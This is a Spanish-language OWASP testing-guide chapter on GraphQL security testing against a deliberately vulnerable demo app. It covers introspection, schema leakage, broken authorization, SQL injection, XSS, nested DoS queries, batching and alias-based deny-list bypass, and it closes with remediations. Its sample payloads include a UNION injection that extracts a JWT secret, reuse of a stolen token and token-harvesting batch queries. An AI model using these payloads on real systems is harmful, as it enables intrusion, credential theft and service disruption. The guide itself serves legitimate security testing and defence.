# GraphQL

|ID          |
|------------|
|WSTG-APIT-99|

## Resumen

GraphQL se ha vuelto muy popular en las API modernas. Proporciona simplicidad y objetos anidados, lo que facilita un desarrollo más rápido. Si bien cada tecnología tiene ventajas, también puede exponer la aplicación a nuevas superficies de ataque. El propósito de este escenario es presentar algunas configuraciones incorrectas comunes y vectores de ataque en aplicaciones que utilizan GraphQL. Algunos vectores son exclusivos de GraphQL (por ejemplo, [Consulta de introspección](#consultas-de-introspección)) y otros son genéricos para las API (por ejemplo, [inyección SQL](#inyección-sql)).

Los ejemplos de esta sección se basarán en una aplicación GraphQL vulnerable [poc-graphql](https://github.com/righettod/poc-graphql), que se ejecuta en un contenedor Docker que asigna `localhost:8080/GraphQL` como nodo GraphQL vulnerable.

## Objetivos de prueba

- Evaluar que se haya implementado una configuración segura y lista para producción.
- Validar todos los campos de entrada frente a ataques genéricos.
- Asegurarse de que se apliquen controles de acceso adecuados.

## Cómo probar

Probar los nodos GraphQL no es muy diferente de probar otras tecnologías de API. Considere los siguientes pasos:

### Consultas de introspección

Las consultas de introspección son el método que GraphQL proporciona para preguntar qué consultas admite, qué tipos de datos están disponibles y muchos otros detalles necesarios al abordar una prueba de un despliegue de GraphQL.

El [sitio web de GraphQL describe la introspección](https://graphql.org/learn/introspection/):

> "A menudo resulta útil solicitar información a un esquema de GraphQL sobre qué consultas admite. GraphQL nos permite hacerlo mediante el sistema de introspección."

Hay un par de maneras de extraer esta información y visualizar el resultado, como se muestra a continuación.

#### Usar la introspección nativa de GraphQL

La forma más sencilla es enviar una solicitud HTTP (usando un proxy personal) con la siguiente carga útil, tomada de un artículo en [Medium](https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696):

```graphql
query IntrospectionQuery {
  __schema {
    queryType {
      name
    }
    mutationType {
      name
    }
    subscriptionType {
      name
    }
    types {
      ...FullType
    }
    directives {
      name
      description
      locations
      args {
        ...InputValue
      }
    }
  }
}
fragment FullType on __Type {
  kind
  name
  description
  fields(includeDeprecated: true) {
    name
    description
    args {
      ...InputValue
    }
    type {
      ...TypeRef
    }
    isDeprecated
    deprecationReason
  }
  inputFields {
    ...InputValue
  }
  interfaces {
    ...TypeRef
  }
  enumValues(includeDeprecated: true) {
    name
    description
    isDeprecated
    deprecationReason
  }
  possibleTypes {
    ...TypeRef
  }
}
fragment InputValue on __InputValue {
  name
  description
  type {
    ...TypeRef
  }
  defaultValue
}
fragment TypeRef on __Type {
  kind
  name
  ofType {
    kind
    name
    ofType {
      kind
      name
      ofType {
        kind
        name
        ofType {
          kind
          name
          ofType {
            kind
            name
            ofType {
              kind
              name
              ofType {
                kind
                name
              }
            }
          }
        }
      }
    }
  }
}
```

El resultado suele ser muy extenso (por lo que aquí se ha abreviado) y contiene todo el esquema del despliegue de GraphQL.

Respuesta:

```json
{
  "data": {
    "__schema": {
      "queryType": {
        "name": "Query"
      },
      "mutationType": {
        "name": "Mutation"
      },
      "subscriptionType": {
        "name": "Subscription"
      },
      "types": [
        {
          "kind": "ENUM",
          "name": "__TypeKind",
          "description": "An enum describing what kind of type a given __Type is",
          "fields": null,
          "inputFields": null,
          "interfaces": null,
          "enumValues": [
            {
              "name": "SCALAR",
              "description": "Indicates this type is a scalar.",
              "isDeprecated": false,
              "deprecationReason": null
            },
            {
              "name": "OBJECT",
              "description": "Indicates this type is an object. `fields` and `interfaces` are valid fields.",
              "isDeprecated": false,
              "deprecationReason": null
            },
            {
              "name": "INTERFACE",
              "description": "Indicates this type is an interface. `fields` and `possibleTypes` are valid fields.",
              "isDeprecated": false,
              "deprecationReason": null
            },
            {
              "name": "UNION",
              "description": "Indicates this type is a union. `possibleTypes` is a valid field.",
              "isDeprecated": false,
              "deprecationReason": null
            },
          ],
          "possibleTypes": null
        }
      ]
    }
  }
}
```

Se puede usar una herramienta como [GraphQL Voyager](https://apis.guru/graphql-voyager/) para comprender mejor el endpoint GraphQL:

![GraphQL Voyager](images/12-voyager.png)\
*Figura 12.1-1: GraphQL Voyager*

Esta herramienta crea una representación en forma de diagrama de entidad-relación (ERD) del esquema GraphQL, lo que permite observar mejor los componentes del sistema que se está probando. Extraer información del diagrama permite ver, por ejemplo, que se puede consultar la tabla Dog. También muestra qué propiedades tiene un Dog:

- ID
- name
- veterinary (ID)

El uso de este método tiene una desventaja: GraphQL Voyager no muestra todo lo que se puede hacer con GraphQL. Por ejemplo, las mutaciones disponibles no aparecen en el diagrama anterior. Una mejor estrategia sería usar tanto Voyager como uno de los métodos que se indican a continuación.

#### Usar GraphiQL

[GraphiQL](https://github.com/graphql/graphiql) es un IDE web para GraphQL. Forma parte del proyecto GraphQL y se usa principalmente para depuración o desarrollo. La práctica recomendada es no permitir que los usuarios accedan a él en despliegues de producción. Si está probando un entorno de preproducción, es posible que tenga acceso a él y, por lo tanto, pueda ahorrar tiempo al trabajar con consultas de introspección (aunque, por supuesto, también puede usar la introspección en la interfaz de GraphiQL).

GraphiQL tiene una sección de documentación que utiliza los datos del esquema para crear un documento de la instancia de GraphQL que se está utilizando. Este documento contiene los tipos de datos, las mutaciones y, básicamente, toda la información que se puede extraer mediante introspección.

#### Usar GraphQL Playground

[GraphQL Playground](https://github.com/graphql/graphql-playground) es un cliente GraphQL. Se puede usar para probar distintas consultas, así como para dividir los IDE de GraphQL en distintos entornos de trabajo y agruparlos por tema o asignándoles un nombre. Al igual que GraphiQL, Playground puede generar documentación sin necesidad de enviar manualmente consultas de introspección ni procesar las respuestas. Tiene otra gran ventaja: no necesita que la interfaz de GraphiQL esté disponible. Puede dirigir la herramienta al nodo GraphQL mediante una URL o usarla localmente con un archivo de datos. GraphQL Playground se puede usar para probar vulnerabilidades directamente, por lo que no es necesario utilizar un proxy personal para enviar solicitudes HTTP. Esto significa que puede utilizar esta herramienta para interactuar de forma sencilla con GraphQL y evaluarlo. Para otras cargas útiles más avanzadas, use un proxy personal.

En algunos casos, deberá configurar los encabezados HTTP en la parte inferior para incluir el ID de sesión u otro mecanismo de autenticación. Esto también permite crear varios «IDE» con distintos permisos para verificar si existen problemas de autorización.

![Playground1](images/12-playground1.png)\
*Figura 12.1-2: Documentación de API de alto nivel de GraphQL Playground*

![Playground2](images/12-playground2.png)\
*Figura 12.1-3: Esquema de API de GraphQL Playground*

Incluso puede descargar los esquemas para usarlos en Voyager.

#### Fuga del esquema mediante sugerencias de campos

Muchas implementaciones de servidores GraphQL (incluidos Apollo Server y `graphql-js`) devuelven sugerencias «Did you mean...?`» de forma predeterminada cuando un cliente hace referencia a un nombre de campo inexistente. Este comportamiento facilita el desarrollo, pero filtra información del esquema incluso cuando se ha deshabilitado explícitamente la introspección.

Envíe un nombre de campo con un pequeño error ortográfico para probarlo. Si el servidor devuelve una sugerencia en la respuesta de error, esta revela el nombre real del campo sin realizar una consulta de introspección.

Por ejemplo, envíe una solicitud con un campo inexistente `userss`:

```graphql
query {
  userss {
    id
  }
}
```

Un servidor vulnerable revela el nombre real del campo en su respuesta:

```json
{
  "errors": [
    {
      "message": "Cannot query field \"userss\" on type \"Query\". Did you mean \"users\"?",
      "locations": [{ "line": 2, "column": 3 }]
    }
  ]
}
```

Pruebe distintas variantes de los nombres que haya adivinado (por ejemplo, `userss`, `usesr`, `usres`) para enumerar, una sugerencia a la vez, nombres válidos de consultas y mutaciones. De esta manera, es posible reconstruir una parte considerable del esquema sin acceso a la introspección.

[Clairvoyance](https://github.com/nikitastupin/clairvoyance) automatiza este proceso al combinar una lista de palabras con las respuestas a las sugerencias para crear un esquema de forma incremental.

#### Conclusión sobre la introspección

La introspección es una herramienta útil que permite a los usuarios obtener más información sobre el despliegue de GraphQL. Sin embargo, también permite que usuarios maliciosos accedan a esa misma información. La práctica recomendada es limitar el acceso a las consultas de introspección, ya que algunas herramientas o solicitudes podrían fallar si esta función se deshabilita por completo. Como GraphQL suele actuar de puente hacia las API del backend del sistema, es mejor aplicar controles de acceso estrictos.

Deshabilitar únicamente la introspección no es suficiente. Deshabilite también las sugerencias de campos en producción, ya que estas permiten la enumeración del esquema de forma independiente.

### Autorización

La introspección es el primer lugar donde buscar problemas de autorización. Como se señaló, debe restringirse el acceso a la introspección, ya que permite extraer y recopilar datos. Una vez que el evaluador tiene acceso al esquema y sabe qué información confidencial puede extraerse, debe enviar consultas que no se bloqueen por falta de privilegios. GraphQL no impone permisos de forma predeterminada, por lo que corresponde a la aplicación aplicar la autorización.

En los ejemplos anteriores, el resultado de la consulta de introspección muestra que existe una consulta llamada `auth`. Parece un buen lugar para extraer información confidencial, como tokens de API, contraseñas, etc.

![Auth GraphQL Query](images/12-auth1.png)\
*Figura 12.1-4: API de consulta Auth de GraphQL*

La forma de probar la implementación de la autorización varía de un despliegue a otro, ya que cada esquema tendrá información confidencial distinta y, por lo tanto, objetivos diferentes en los que centrarse.

En este ejemplo vulnerable, todos los usuarios (incluso los no autenticados) pueden acceder a los tokens de autenticación de todos los veterinarios incluidos en la base de datos. Estos tokens se pueden usar para realizar otras acciones que permite el esquema, como asociar o desasociar un perro a cualquier veterinario especificado mediante mutaciones, incluso si la solicitud no contiene un token de autenticación que corresponda al veterinario.

A continuación se muestra un ejemplo en el que el evaluador usa un token extraído que no le pertenece para realizar una acción como el veterinario «Benoit»:

```graphql
query brokenAccessControl {
  myInfo(accessToken:"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJhdWQiOiJwb2MiLCJzdWIiOiJKdWxpZW4iLCJpc3MiOiJBdXRoU3lzdGVtIiwiZXhwIjoxNjAzMjkxMDE2fQ.r3r0hRX_t7YLiZ2c2NronQ0eJp8fSs-sOUpLyK844ew", veterinaryId: 2){
    id, name, dogs {
      name
    }
  }
}
```

Y la respuesta:

```json
{
  "data": {
    "myInfo": {
      "id": 2,
      "name": "Benoit",
      "dogs": [
        {
          "name": "Babou"
        },
        {
          "name": "Baboune"
        },
        {
          "name": "Babylon"
        },
        {
          "name": "..."
        }
      ]
    }
  }
}
```

Todos los perros de la lista pertenecen a Benoit, no al propietario del token de autenticación. Es posible realizar este tipo de acciones cuando no se implementa una aplicación adecuada de los controles de autorización.

### Inyección

GraphQL es la implementación de la capa de API de una aplicación y, como tal, suele reenviar las solicitudes a una API de backend o directamente a la base de datos. Esto permite aprovechar cualquier vulnerabilidad subyacente, como la inyección SQL, la inyección de comandos, el cross-site scripting, etc. El uso de GraphQL solo cambia el punto de entrada de la carga útil maliciosa.

Puede consultar otros escenarios de la guía de pruebas de OWASP para obtener algunas ideas.

GraphQL también tiene escalares, que suelen usarse para tipos de datos personalizados que no cuentan con tipos de datos nativos, como DateTime. Estos tipos de datos no tienen validación incorporada, lo que los convierte en buenos candidatos para las pruebas.

#### Inyección SQL

La aplicación de ejemplo es vulnerable por diseño en la consulta `dogs(namePrefix: String, limit: Int = 500): [Dog!]`, ya que el parámetro `namePrefix` se concatena en la consulta SQL. Concatenar la entrada del usuario es una mala práctica común que puede exponer las aplicaciones a la inyección SQL.

La siguiente consulta extrae información de la tabla `CONFIG` de la base de datos:

```graphql
query sqli {
  dogs(namePrefix: "ab%' UNION ALL SELECT 50 AS ID, C.CFGVALUE AS NAME, NULL AS VETERINARY_ID FROM CONFIG C LIMIT ? -- ", limit: 1000) {
    id
    name
  }
}
```

La respuesta a esta consulta es:

```json
{
  "data": {
    "dogs": [
      {
        "id": 1,
        "name": "Abi"
      },
      {
        "id": 2,
        "name": "Abime"
      },
      {
        "id": 3,
        "name": "..."
      },
      {
        "id": 50,
        "name": "$Nf!S?(.}DtV2~:Txw6:?;D!M+Z34^"
      }
    ]
  }
}
```

La consulta contiene el secreto que firma los JWT en la aplicación de ejemplo, lo cual constituye información muy confidencial.

Para saber qué buscar en una aplicación concreta, será útil recopilar información sobre cómo está construida y cómo se organizan las tablas de la base de datos. También puede usar herramientas como `sqlmap` para buscar rutas de inyección e incluso automatizar la extracción de datos de la base de datos.

#### Cross-Site Scripting (XSS)

El cross-site scripting se produce cuando un atacante inyecta código ejecutable que posteriormente ejecuta el navegador. Consulte las pruebas de XSS en el capítulo [Pruebas de inyección](../07-Injection/README.md). Puede probar el XSS reflejado con una carga útil de [Cross-site scripting reflejado](../07-Injection/01-Reflected_Cross_Site_Scripting.md).

En este ejemplo, los errores podrían reflejar la entrada y provocar XSS.

Carga útil:

```graphql
query xss  {
  myInfo(veterinaryId:"<script>alert('1')</script>" ,accessToken:"<script>alert('1')</script>") {
    id
    name
  }
}
```

Respuesta:

```json
{
  "data": null,
  "errors": [
    {
      "message": "Validation error of type WrongType: argument 'veterinaryId' with value 'StringValue{value='<script>alert('1')</script>'}' is not a valid 'Int' @ 'myInfo'",
      "locations": [
        {
          "line": 2,
          "column": 10,
          "sourceName": null
        }
      ],
      "description": "argument 'veterinaryId' with value 'StringValue{value='<script>alert('1')</script>'}' is not a valid 'Int'",
      "validationErrorType": "WrongType",
      "queryPath": [
        "myInfo"
      ],
      "errorType": "ValidationError",
      "extensions": null,
      "path": null
    }
  ]
}
```

### Consultas de denegación de servicio (DoS)

GraphQL expone una interfaz muy sencilla que permite a los desarrolladores usar consultas y objetos anidados. Esta capacidad también puede utilizarse de forma maliciosa mediante una consulta profundamente anidada, similar a una función recursiva, y provocar una denegación de servicio al consumir CPU, memoria u otros recursos informáticos.

Si volvemos a la *Figura 12.1-1*, se puede ver que es posible crear un bucle en el que un objeto Dog contiene un objeto Veterinary. Podría haber una cantidad ilimitada de objetos anidados.

Esto permite realizar una consulta profunda que podría sobrecargar la aplicación:

```graphql
query dos {
  allDogs(onlyFree: false, limit: 1000000) {
    id
    name
    veterinary {
      id
      name
      dogs {
        id
        name
        veterinary {
          id
          name
          dogs {
            id
            name
            veterinary {
              id
              name
              dogs {
                id
                name
                veterinary {
                  id
                  name
                  dogs {
                    id
                    name
                    veterinary {
                      id
                      name
                      dogs {
                        id
                        name
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  }
}
```

Se pueden implementar varias medidas de seguridad para prevenir este tipo de consultas, que se enumeran en la sección de [Corrección](#corrección). Las consultas abusivas pueden causar problemas como DoS en los despliegues de GraphQL y deben incluirse en las pruebas.

### Ataques por lotes

GraphQL admite el procesamiento por lotes de varias consultas en una sola solicitud. Esto permite a los usuarios solicitar de forma eficiente varios objetos o varias instancias de objetos. Sin embargo, un atacante puede aprovechar esta funcionalidad para realizar un ataque por lotes. Enviar más de una consulta en una sola solicitud se vería así:

```graphql
[
  {
    query: < query 0 >,
    variables: < variables for query 0 >,
  },
  {
    query: < query 1 >,
    variables: < variables for query 1 >,
  },
  {
    query: < query n >
    variables: < variables for query n >,
  }
]
```

En la aplicación de ejemplo, se puede enviar una sola solicitud para extraer todos los nombres de los veterinarios mediante el ID fácil de adivinar (es un entero incremental). Luego, un atacante puede usar los nombres para obtener tokens de acceso. En lugar de hacerlo mediante muchas solicitudes, que podrían bloquearse por una medida de seguridad de red, como un firewall de aplicaciones web, o por un limitador de tasa como Nginx, las solicitudes se pueden agrupar en lotes. Esto significa que solo habría un par de solicitudes, lo que podría permitir realizar fuerza bruta de forma eficiente sin ser detectado. Este es un ejemplo de consulta:

```graphql
query {
  Veterinary(id: "1") {
    name
  }
  second:Veterinary(id: "2") {
    name
  }
  third:Veterinary(id: "3") {
    name
  }
}
```

Esto proporcionará al atacante los nombres de los veterinarios y, como se mostró anteriormente, los nombres se pueden usar para agrupar varias consultas que soliciten los tokens de autenticación de esos veterinarios. Por ejemplo:

```graphql
query {
  auth(veterinaryName: "Julien")
  second: auth(veterinaryName:"Benoit")
}
```

Los ataques por lotes se pueden usar para evadir muchas medidas de seguridad aplicadas en los sitios. También se pueden usar para enumerar objetos e intentar forzar por fuerza bruta la autenticación multifactor u otra información confidencial.

### Evasión de listas de denegación de consultas mediante alias

GraphQL permite asignar un alias a cualquier campo de una consulta: un nombre alternativo que se utiliza para etiquetar el resultado. Esta es una característica estándar del lenguaje, pero se puede abusar de ella para evadir controles de seguridad mal implementados que buscan nombres de campos específicos.

Algunos despliegues implementan una lista de denegación de consultas mediante una comparación ingenua de cadenas o expresiones regulares en el documento GraphQL sin procesar (por ejemplo, rechazando cualquier consulta que contenga el nombre de campo `adminUsers` solo cuando aparece como `adminUsers {` o `adminUsers(`, sin analizar completamente la sintaxis ni construir un AST). Una implementación robusta que busque `adminUsers` como subcadena en cualquier parte de la solicitud, o que analice correctamente la estructura de la consulta, seguirá detectando las llamadas con alias, porque el nombre del campo subyacente `adminUsers` permanece en la operación y el alias no lo renombra ni lo elimina. Sin embargo, las comprobaciones simplistas que no gestionan la sintaxis `aliasName: fieldName` pueden evadirse emitiendo el mismo campo con un alias, mientras que el resolver de `adminUsers` sigue ejecutándose en el servidor. En la terminología de GraphQL, `adminUsers` en los siguientes ejemplos es un nombre de campo; el nombre de una operación aparecería después de la palabra clave `query` (por ejemplo, `query GetAdmins { ... }`).

Primero, envíe la consulta directamente para confirmar que está bloqueada:

```graphql
query {
  adminUsers {
    id
    name
    email
  }
}
```

Respuesta (bloqueada por la lista de denegación):

```json
{
  "errors": [
    {
      "message": "400 Bad Request: query not allowed"
    }
  ]
}
```

Luego, vuelva a enviar la misma consulta usando un alias:

```graphql
query {
  s: adminUsers {
    id
    name
    email
  }
}
```

Respuesta (se evadió la lista de denegación y se devolvieron los datos):

```json
{
  "data": {
    "s": [
      { "id": 1, "name": "Admin", "email": "admin@example.com" }
    ]
  }
}
```

El servidor resuelve `s` como `adminUsers` porque los alias son una construcción de la capa GraphQL; el resolver subyacente se ejecuta con normalidad. Una lista de denegación que solo compara el nombre de campo literal en el cuerpo de la solicitud no detectará las llamadas con alias.

Para cada consulta que parezca estar bloqueada o restringida, intente anteponerle un alias arbitrario (por ejemplo, `x:`, `s:`, `bypass:`) y observe si la respuesta cambia de un error a una carga útil de datos correcta.

### Mensajes de error detallados

GraphQL puede encontrar errores inesperados durante la ejecución. Cuando se produce un error de este tipo, el servidor puede enviar una respuesta de error que revele detalles internos del error, configuraciones de la aplicación o datos. Esto permite que un usuario malicioso obtenga más información sobre la aplicación. Como parte de las pruebas, se deben comprobar los mensajes de error enviando datos inesperados, en un proceso conocido como fuzzing. Se deben buscar en las respuestas datos potencialmente confidenciales que puedan revelarse mediante esta técnica.

### Exposición de la API subyacente

GraphQL es una tecnología relativamente nueva y algunas aplicaciones están migrando de API antiguas a GraphQL. En muchos casos, GraphQL se despliega como una API estándar que traduce las solicitudes (enviadas mediante la sintaxis de GraphQL) a una API subyacente, así como las respuestas. Si no se comprueba debidamente la autorización de las solicitudes a la API subyacente, esto podría dar lugar a una escalada de privilegios.

Por ejemplo, una solicitud que contenga el parámetro `id=1/delete` podría interpretarse como `/api/users/1/delete`. Esto podría extenderse a la manipulación de otros recursos que pertenecen a `user=1`. También es posible que la solicitud se interprete como si tuviera la autorización concedida al nodo GraphQL, en lugar de la del solicitante real.

El evaluador debe intentar obtener acceso a los métodos de la API subyacente, ya que podría ser posible escalar privilegios.

## Corrección

- Restringir el acceso a las consultas de introspección.
- Deshabilitar las sugerencias de campos en producción: la mayoría de los servidores GraphQL permiten desactivarlas (por ejemplo, en Apollo Server, establecer [hideSchemaDetailsFromClientErrors](https://www.apollographql.com/docs/apollo-server/api/apollo-server#hideschemadetailsfromclienterrors)). Esto evita la enumeración del esquema mediante respuestas de error «Did you mean?».
- Implementar la validación de entradas.
    - GraphQL no tiene una forma nativa de validar las entradas; sin embargo, existe un proyecto de código abierto llamado ["graphql-constraint-directive"](https://github.com/confuser/graphql-constraint-directive) que permite validar las entradas como parte de la definición del esquema.
    - La validación de entradas por sí sola es útil, pero no constituye una solución completa, por lo que deben adoptarse medidas adicionales para mitigar los ataques de inyección.
- Implementar medidas de seguridad para prevenir consultas abusivas.
    - Tiempos de espera: restringir el tiempo durante el que se permite ejecutar una consulta.
    - Profundidad máxima de consulta: limitar la profundidad de las consultas permitidas, lo que puede evitar que las consultas demasiado profundas abusen de los recursos.
    - Establecer la complejidad máxima de las consultas: limitar la complejidad de las consultas para mitigar el abuso de los recursos de GraphQL.
    - Usar limitación basada en el tiempo de servidor: limitar la cantidad de tiempo de servidor que puede consumir un usuario.
    - Usar limitación basada en la complejidad de las consultas: limitar la complejidad total de las consultas que puede consumir un usuario.
- Enviar mensajes de error genéricos: usar mensajes de error genéricos que no revelen detalles del despliegue.
- Mitigar los ataques por lotes:
    - Añadir limitación de la tasa de solicitudes de objetos en el código.
    - Impedir el procesamiento por lotes de objetos confidenciales.
    - Limitar la cantidad de consultas que se pueden ejecutar al mismo tiempo.
- Prevenir la evasión de listas de denegación de consultas: implementar controles de acceso en el nivel del resolver en lugar de depender únicamente de listas de denegación de nombres de operación, ya que los alias de GraphQL permiten a quienes llaman invocar cualquier campo con un nombre arbitrario.

Para obtener más información sobre cómo corregir las debilidades de GraphQL, consulte la [Hoja de referencia de GraphQL](https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html).

## Herramientas

- [GraphQL Playground](https://github.com/prisma-labs/graphql-playground)
- [GraphQL Voyager](https://apis.guru/graphql-voyager/)
- [sqlmap](https://github.com/sqlmapproject/sqlmap)
- [InQL (extensión de Burp)](https://portswigger.net/bappstore/296e9a0730384be4b2fffef7b4e19b1f)
- [GraphQL Raider (extensión de Burp)](https://portswigger.net/bappstore/4841f0d78a554ca381c65b26d48207e6)
- [GraphQL (complemento para ZAP)](https://www.zaproxy.org/blog/2020-08-28-introducing-the-graphql-add-on-for-zap/)
- [GraphQLer](https://github.com/omar2535/GraphQLer)
- [Clairvoyance](https://github.com/nikitastupin/clairvoyance)

## Referencias

- [poc-graphql](https://github.com/righettod/poc-graphql)
- [Sitio oficial de GraphQL](https://graphql.org/learn/)
- [Howtographql - Seguridad](https://www.howtographql.com/advanced/4-security/)
- [GraphQL Constraint Directive](https://github.com/confuser/graphql-constraint-directive)
- [Pruebas del lado del cliente](../11-Client-side/README.md) (XSS y otras vulnerabilidades)
- [5 vulnerabilidades de seguridad comunes de GraphQL](https://web.archive.org/web/20210126172623/https://carvesystems.com/news/the-5-most-common-graphql-security-vulnerabilities/)
- [Vulnerabilidades comunes de GraphQL y cómo explotarlas](https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696)
- [GraphQL CS](https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html)
- [Conceptos básicos de enumeración de GraphQL](https://blog.cyberadvisors.com/technical-blog/blog/graphql-apis-enumeration-basics)
- [Vulnerabilidades de API GraphQL](https://portswigger.net/web-security/graphql)